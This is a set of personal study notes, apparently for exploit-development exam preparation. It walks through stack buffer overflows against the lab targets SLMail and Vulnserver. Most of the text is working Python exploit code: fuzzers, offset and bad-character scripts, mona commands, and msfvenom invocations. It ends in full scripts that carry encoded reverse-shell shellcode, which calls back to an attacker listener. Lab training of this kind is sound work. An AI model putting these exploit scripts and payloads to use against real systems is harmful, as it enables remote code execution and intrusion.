# Reference : 
https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow
https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/README.md
https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/
https://github.com/Jean13/WarFTP_Exploit/blob/master/WarFTP_Exploit_Write-Up.txt
https://www.ired.team/miscellaneous-reversing-forensics/reversing-password-checking-routine   //// check flag in binary
	
### Exam Prepare : 
https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/
https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/README.md
	
### Practise Linux : 
https://resources.infosecinstitute.com/brainpan_virtual_machine/
https://medium.com/@shellbr3ak/pwnable-kr-bof-d78f3ed36747
https://resources.infosecinstitute.com/brainpan_virtual_machine/
	
### Practice Windows : 
        Vulnserver
		
## SLMAIL
#### Fuzzer :
	 
1. Mybuffercode.py
	#!/usr/bin/python
	import socket
	 
	buffer=["A"]
	counter=100
	while len(buffer) <=30:
	      buffer.append("A"*counter)
	      counter=counter+200
	 
	for string in buffer:
	      print "Fuzzing Pass with %s bytes" % len(string)
	      s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	      connect=s.connect(('192.168.58.145', 110)
	      s.recv(1024)
	      s.send('USER test\r\n')
	      s.recv(1024)
	      s.send('PASS' + string + '\r\n')
	      s.send('QUIT\r\n')
	      s.close()
2. Start slmail , start immunity debugger and attach slmail
3. At kali ./mybuffercode.py
4. Check EIP , ESP and EBP
 
 
#### Crash slmail without fuzzer :
 
	#!/usr/bin/python
	import socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	buffer = 'A' * 2700
	try:
	    print "\nSending evil buffer..."
	    s.connect(('192.168.85.148', 110))
	    data = s.recv(1024)
	    s.send('USER username' +'\r\n')
	    data = s.recv(1024)
	    s.send('PASS ' + buffer + '\r\n')
	    print "\nDone!."
	except:
	    print "Could not connect to POP3!"
	 
	 
#### Control EIP :
1. To Find the offset value and 4bytes which is overwritten in EIP
	To create unique values to find 4bytes in EIP : /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
	Replace this values to buffer in script
2. As per immunity EIP value 39694438 and ESP 0145A120  [EIP address in dump 0145A11C]
3. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
	[*] Exact match at offset 2606
4. Then modify buffer buffer = "A" * 2606   "B" * 4   "C" * 90
5. ESP address 014AA120, EBP value 41414141, EIP value 42424242 , address 014AA11C
6. Increase buffer size for shell code buffer = "A" * 2606  +"B" * 4  +"C" * (3500 -2610)
7. Check for bad characters from 0x00 to 0xff
```
	#!/usr/bin/python
	import socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	badchars = (
	"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
	"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
	"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
	"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
	"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
	"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
	"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
	"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
	"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
	"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
	"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
	"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
	"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
	"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
	"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
	 
	 
	buffer = 'A'*2606 + 'B'*4 +  badchars
	 
	try:
	       print "\nSending evil buffer..."
	       s.connect(('192.168.85.148', 110))
	       data = s.recv(1024)
	       s.send('USER username' +'\r\n')
	       data = s.recv(1024)
	       s.send('PASS ' + buffer + '\r\n')
	       print "\nDone!."
	except:
	        print "Could not connect to POP3!"
```
Noticed \0a\0d are the badchars to be removed. Then try again
	 
8. Finding the right module and location for JMP ESP: We use mona module to find list of dlls loaded by slmail and use the one that has ASLR and DEP disabled. Eg SLMFC.dll
           Search for > Command (or use Ctrl + F) to find a JMP ESP command. Or search using opcode
To find the opcode equivalent to JMP ESP, we can use the
Metasploit NASM Shell ruby script:
```
root@kali:~#/usr/share/metasploit5framework/tools/nasm_shell.rb
nasm>jmp esp
00000000 FFE4  jmp esp
```
You can also search for the opcode, which is FFE4 using Mona.py. Enter this command into the bottom text field: !mona find -s “\xff\xe4″ -m slmfc.dll
 
1. Generating shell code : "\x90" is for No opertions 
	 
```
	msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine IP] LPORT=1234 -f c -a x86 --platform windows -b "\x00\x0A\x0D" -e x86/shikata_ga_nai
	
	#!/usr/bin/python
	
	import socket
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	shell = (
	"\xb8\x4a\x1d\x26\xe4\xdb\xdb\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
	"\x52\x31\x43\x12\x03\x43\x12\x83\x89\x19\xc4\x11\xf1\xca\x8a"
	"\xda\x09\x0b\xeb\x53\xec\x3a\x2b\x07\x65\x6c\x9b\x43\x2b\x81"
	"\x50\x01\xdf\x12\x14\x8e\xd0\x93\x93\xe8\xdf\x24\x8f\xc9\x7e"
	"\xa7\xd2\x1d\xa0\x96\x1c\x50\xa1\xdf\x41\x99\xf3\x88\x0e\x0c"
	"\xe3\xbd\x5b\x8d\x88\x8e\x4a\x95\x6d\x46\x6c\xb4\x20\xdc\x37"
	"\x16\xc3\x31\x4c\x1f\xdb\x56\x69\xe9\x50\xac\x05\xe8\xb0\xfc"
	"\xe6\x47\xfd\x30\x15\x99\x3a\xf6\xc6\xec\x32\x04\x7a\xf7\x81"
	"\x76\xa0\x72\x11\xd0\x23\x24\xfd\xe0\xe0\xb3\x76\xee\x4d\xb7"
	"\xd0\xf3\x50\x14\x6b\x0f\xd8\x9b\xbb\x99\x9a\xbf\x1f\xc1\x79"
	"\xa1\x06\xaf\x2c\xde\x58\x10\x90\x7a\x13\xbd\xc5\xf6\x7e\xaa"
	"\x2a\x3b\x80\x2a\x25\x4c\xf3\x18\xea\xe6\x9b\x10\x63\x21\x5c"
	"\x56\x5e\x95\xf2\xa9\x61\xe6\xdb\x6d\x35\xb6\x73\x47\x36\x5d"
	"\x83\x68\xe3\xf2\xd3\xc6\x5c\xb3\x83\xa6\x0c\x5b\xc9\x28\x72"
	"\x7b\xf2\xe2\x1b\x16\x09\x65\xe4\x4f\x2b\xf5\x8c\x8d\x4b\xf1"
	"\x9e\x1b\xad\x93\x0e\x4a\x66\x0c\xb6\xd7\xfc\xad\x37\xc2\x79"
	"\xed\xbc\xe1\x7e\xa0\x34\x8f\x6c\x55\xb5\xda\xce\xf0\xca\xf0"
	"\x66\x9e\x59\x9f\x76\xe9\x41\x08\x21\xbe\xb4\x41\xa7\x52\xee"
	"\xfb\xd5\xae\x76\xc3\x5d\x75\x4b\xca\x5c\xf8\xf7\xe8\x4e\xc4"
	"\xf8\xb4\x3a\x98\xae\x62\x94\x5e\x19\xc5\x4e\x09\xf6\x8f\x06"
	"\xcc\x34\x10\x50\xd1\x10\xe6\xbc\x60\xcd\xbf\xc3\x4d\x99\x37"
	"\xbc\xb3\x39\xb7\x17\x70\x49\xf2\x35\xd1\xc2\x5b\xac\x63\x8f"
	"\x5b\x1b\xa7\xb6\xdf\xa9\x58\x4d\xff\xd8\x5d\x09\x47\x31\x2c"
	"\x02\x22\x35\x83\x23\x67" )
	 
	 
	buffer = 'A'*2606 + "\x8f\x35\x4a\x5f" + "\x90"*8  +  shell
	 
	try:
	            print "\nSending evil buffer..."
	            s.connect(('192.168.85.148', 110))
	            data = s.recv(1024)
	            s.send('USER username' +'\r\n')
	            data = s.recv(1024)
	            s.send('PASS ' + buffer + '\r\n')
	            print "\nDone!."
	except:
	            print "Could not connect to POP3!"
```		    
2. nc -nlvp 1234 in kali and ./final.py
 
 
## VULNSERVER
 
Check if !mona works 
if required change mona directory !mona config -set workingfolder c:\logs\%p
!mona pc 6000  ///to create pattern for offset calc (Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac)

!mona bytearray   //// To create list of all chars for comaprison for bad chars
This will generate two files in c:\logs\slmail: bytearray.txt, with the array in text format to use on the exploit, and bytearray.bin, with the exact representation of this byte array in memory.
!mona compare -f c:\logs\slmail\bytearray.bin -a 0x01cea154 (address contained on ESP)

!mona bytearray -cpb \x00\x0a  (to exclude badchars and try again till its unmodified)
!mona compare -f c:\logs\slmail\bytearray.bin -a 0x01cea154

1. Fuzzing
```
	#! /usr/bin/python
	import socket
	import sys
	 
	buffer=["A"]
	counter=100
	while len(buffer) <= 30:
	    buffer.append("A"*counter)
	    counter=counter+200
	 
	for string in buffer:
	    print "fuzzing with %s bytes" %len(string)
	    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    connect=s.connect(('192.168.58.148', 9999))
	    s.send(('TRUN /.:/' + string))
	    s.close
```

2. Finding offset :
 
          To create unique values to find 4bytes in EIP : root@kali:~/vulnserver# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900
 
```	                                                                                     
	#! /usr/bin/python
	import socket
	import sys
	 
	string="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2>
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.58.148', 9999))
	s.send(('TRUN /.:/' + string))
	s.close
```	 
	 
	EIP value after crash is 386F4337
```
	root@kali:~/vulnserver# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
	[*] Exact match at offset 2003
```
	 
	Use !mona findmsp 
	or
        !mona pattern_offset 0x7A46317A (where 0x7A46317A is the value of EIP at the crash time)
	
	
	
3. Check the offset found is 2003
```
	#! /usr/bin/python
	import socket
	import sys
	 
	string= 'A'*2003 + 'B'*4 + C*100
	 
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.58.148', 9999))
	s.send(('TRUN /.:/' + string))
	s.close
```	 
  4.    Finding badchars : No badchar found

```
#! /usr/bin/python
import socket
import sys
 
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
 
string= 'A'*2003 + 'B'*4 + badchars
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.58.148', 9999))
s.send(('TRUN /.:/' + string))
s.close

```

***************************methoddostack*******************

```                                                                                           
#!/usr/bin/env python2

import socket

RHOST = "192.168.58.149"
RPORT = 9999


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

badchar_test = "" # start with an empty string
badchars = [0x00, 0x0A] # we've reasoned that these are definitely bad

for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
if i not in badchars: # skip the badchars
  badchar_test += chr(i) # append each non-badchar char to the string


with open("badchar_test.bin", "wb") as f:
f.write(badchar_test)



buf = ""
buf += "A"*2003
buf += "B"*4
buf += badchar_test

s.send(('TRUN /.:/' + buf))
```
 
Can also be done using !mona compare -a esp -f c:\badchar_test.bin

******************************************************************************

5. Finding right modules : 1. first find dll and then JMP ESP address in the dll
!mona modules - to check all modules vulnserver uses
 Select the one with all memory protections as false - essfunc.dll
 
Find opcode for assemble language command - JMP ESP using nasm
```
root@kali:~/vulnserver# locate nasm_shell
/usr/bin/msf-nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
root@kali:~/vulnserver# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
```

!mona find -s "\xff\xe4" -m essfunc.dll
Message=  0x625011bb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\essfunc.dll)
 
Note: be careful with bad characters when you pick up the jmp esp instruction.
or try : !mona jmp -r esp -cpb "\x00\x0A"

So EIP to point to "\xbb\x11\x50\x62"


******************Endian*********************
root@kali:~# python
Python 2.7.18 (default, Apr 20 2020, 20:30:41)
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import struct
>>> struct.pack("<I", 0xCAFE)
'\xfe\xca\x00\x00'
>>> struct.pack("<I", 0xDEADBEEF)
'\xef\xbe\xad\xde'
 
******************Endian*********************

Set a breakpoint at Jmp esp to check or use below (go to follow in dump for 625011bb then  F2 to set break point)

****************Testjmpesp using int3***********************
```
#!/usr/bin/env python2
import socket

RHOST = "192.168.58.149"
RPORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf  = ""
buf += "A"*2003
buf += "\xaf\x11\x50\x62"
buf += "\xCC\xCC\xCC\xCC"

s.send(('TRUN /.:/' + buf))
```

***********************************************************


6. Creating  a shell to get shell :
 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.58.148 LPORT=1234 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai
Or
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.58.148 LPORT=1234 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
 
-b badcharacters
-a  x86   (64bit machine)
--platform windows
-f c (type c shell code)
EXITFUNC=thread to maintain stability , not to gain connection and loose connection

*****************ADDINGNOP****************************
``` 
#! /usr/bin/python
import socket
import sys
 
shell = (
"\xd9\xc2\xb8\x4d\xa8\xa1\xef\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x47\x17\x03\x47\x17\x83\x8a\xac\x43\x1a\xe8\x45\x01"
"\xe5\x10\x96\x66\x6f\xf5\xa7\xa6\x0b\x7e\x97\x16\x5f\xd2\x14"
"\xdc\x0d\xc6\xaf\x90\x99\xe9\x18\x1e\xfc\xc4\x99\x33\x3c\x47"
"\x1a\x4e\x11\xa7\x23\x81\x64\xa6\x64\xfc\x85\xfa\x3d\x8a\x38"
"\xea\x4a\xc6\x80\x81\x01\xc6\x80\x76\xd1\xe9\xa1\x29\x69\xb0"
"\x61\xc8\xbe\xc8\x2b\xd2\xa3\xf5\xe2\x69\x17\x81\xf4\xbb\x69"
"\x6a\x5a\x82\x45\x99\xa2\xc3\x62\x42\xd1\x3d\x91\xff\xe2\xfa"
"\xeb\xdb\x67\x18\x4b\xaf\xd0\xc4\x6d\x7c\x86\x8f\x62\xc9\xcc"
"\xd7\x66\xcc\x01\x6c\x92\x45\xa4\xa2\x12\x1d\x83\x66\x7e\xc5"
"\xaa\x3f\xda\xa8\xd3\x5f\x85\x15\x76\x14\x28\x41\x0b\x77\x25"
"\xa6\x26\x87\xb5\xa0\x31\xf4\x87\x6f\xea\x92\xab\xf8\x34\x65"
"\xcb\xd2\x81\xf9\x32\xdd\xf1\xd0\xf0\x89\xa1\x4a\xd0\xb1\x29"
"\x8a\xdd\x67\xfd\xda\x71\xd8\xbe\x8a\x31\x88\x56\xc0\xbd\xf7"
"\x47\xeb\x17\x90\xe2\x16\xf0\x5f\x5a\x22\x80\x08\x99\x52\x84"
"\x1a\x14\xb4\xee\x8a\x71\x6f\x87\x33\xd8\xfb\x36\xbb\xf6\x86"
"\x79\x37\xf5\x77\x37\xb0\x70\x6b\xa0\x30\xcf\xd1\x67\x4e\xe5"
"\x7d\xeb\xdd\x62\x7d\x62\xfe\x3c\x2a\x23\x30\x35\xbe\xd9\x6b"
"\xef\xdc\x23\xed\xc8\x64\xf8\xce\xd7\x65\x8d\x6b\xfc\x75\x4b"
"\x73\xb8\x21\x03\x22\x16\x9f\xe5\x9c\xd8\x49\xbc\x73\xb3\x1d"
"\x39\xb8\x04\x5b\x46\x95\xf2\x83\xf7\x40\x43\xbc\x38\x05\x43"
"\xc5\x24\xb5\xac\x1c\xed\xd5\x4e\xb4\x18\x7e\xd7\x5d\xa1\xe3"
"\xe8\x88\xe6\x1d\x6b\x38\x97\xd9\x73\x49\x92\xa6\x33\xa2\xee"
"\xb7\xd1\xc4\x5d\xb7\xf3")
 
string= 'A'*2003 + "\xbb\x11\x50\x62" + '\x90'*8 + shell
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.58.148', 9999))
s.send(('TRUN /.:/' + string))
s.close
``` 
 ************************************************************SUBESPWAY*********************

% ~/opt/metasploit-framework/tools/exploit/metasm_shell.rb
type "exit" or "quit" to quit
use ";" or "\n" for newline
type "file <file>" to parse a GAS assembler source file
metasm >
We want to move ESP up the stack towards lower addresses, so ask
metasm_shell.rb to assemble the instruction SUB ESP,0x10
metasm > sub esp,0x10
"\x83\xec\x10"

or sub esp, 10h
or add esp, -10h

buf  = ""
buf += "A"*2003
buf += "\xaf\x11\x50\x62"
buf +="\x83\xec\x10"

(It should not contain bad chars)
******************************************************************************************************usingpythonshell and SUBesp**********

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.58.128 LPORT=1234 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00"


```
#! /usr/bin/python
import socket
import sys

buf =  b""
buf += b"\xbb\xe7\xbc\xb9\x5c\xda\xdb\xd9\x74\x24\xf4\x5f\x33"
buf += b"\xc9\xb1\x52\x31\x5f\x12\x83\xc7\x04\x03\xb8\xb2\x5b"
buf += b"\xa9\xba\x23\x19\x52\x42\xb4\x7e\xda\xa7\x85\xbe\xb8"
buf += b"\xac\xb6\x0e\xca\xe0\x3a\xe4\x9e\x10\xc8\x88\x36\x17"
buf += b"\x79\x26\x61\x16\x7a\x1b\x51\x39\xf8\x66\x86\x99\xc1"
buf += b"\xa8\xdb\xd8\x06\xd4\x16\x88\xdf\x92\x85\x3c\x6b\xee"
buf += b"\x15\xb7\x27\xfe\x1d\x24\xff\x01\x0f\xfb\x8b\x5b\x8f"
buf += b"\xfa\x58\xd0\x86\xe4\xbd\xdd\x51\x9f\x76\xa9\x63\x49"
buf += b"\x47\x52\xcf\xb4\x67\xa1\x11\xf1\x40\x5a\x64\x0b\xb3"
buf += b"\xe7\x7f\xc8\xc9\x33\xf5\xca\x6a\xb7\xad\x36\x8a\x14"
buf += b"\x2b\xbd\x80\xd1\x3f\x99\x84\xe4\xec\x92\xb1\x6d\x13"
buf += b"\x74\x30\x35\x30\x50\x18\xed\x59\xc1\xc4\x40\x65\x11"
buf += b"\xa7\x3d\xc3\x5a\x4a\x29\x7e\x01\x03\x9e\xb3\xb9\xd3"
buf += b"\x88\xc4\xca\xe1\x17\x7f\x44\x4a\xdf\x59\x93\xad\xca"
buf += b"\x1e\x0b\x50\xf5\x5e\x02\x97\xa1\x0e\x3c\x3e\xca\xc4"
buf += b"\xbc\xbf\x1f\x4a\xec\x6f\xf0\x2b\x5c\xd0\xa0\xc3\xb6"
buf += b"\xdf\x9f\xf4\xb9\x35\x88\x9f\x40\xde\x77\xf7\x70\x9e"
buf += b"\x10\x0a\x84\x9a\x32\x83\x62\xc8\xa2\xc2\x3d\x65\x5a"
buf += b"\x4f\xb5\x14\xa3\x45\xb0\x17\x2f\x6a\x45\xd9\xd8\x07"
buf += b"\x55\x8e\x28\x52\x07\x19\x36\x48\x2f\xc5\xa5\x17\xaf"
buf += b"\x80\xd5\x8f\xf8\xc5\x28\xc6\x6c\xf8\x13\x70\x92\x01"
buf += b"\xc5\xbb\x16\xde\x36\x45\x97\x93\x03\x61\x87\x6d\x8b"
buf += b"\x2d\xf3\x21\xda\xfb\xad\x87\xb4\x4d\x07\x5e\x6a\x04"
buf += b"\xcf\x27\x40\x97\x89\x27\x8d\x61\x75\x99\x78\x34\x8a"
buf += b"\x16\xed\xb0\xf3\x4a\x8d\x3f\x2e\xcf\xad\xdd\xfa\x3a"
buf += b"\x46\x78\x6f\x87\x0b\x7b\x5a\xc4\x35\xf8\x6e\xb5\xc1"
buf += b"\xe0\x1b\xb0\x8e\xa6\xf0\xc8\x9f\x42\xf6\x7f\x9f\x46"

string= 'A'*2003 + "\xbb\x11\x50\x62" + "\x83\xec\x10" + buf

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.58.149', 9999))
s.send(('TRUN /.:/' + string))
s.close
```
